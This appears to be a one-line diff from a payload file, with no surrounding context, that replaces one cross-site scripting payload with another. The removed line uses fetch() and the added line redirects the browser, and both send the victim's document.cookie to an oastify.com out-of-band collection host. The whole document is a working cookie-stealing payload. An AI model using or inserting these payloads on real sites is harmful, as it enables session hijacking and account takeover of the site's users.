@@ -1,1 +1,1 @@
-fetch('https://0ijf33p4f8txcj3qk7ax8q4rkiq9e52u.oastify.com?c='+document.cookie)
+document.location='https://345ip6b71bf0ympt6aw0utqu6lcc09oy.oastify.com?c='+document.cookie
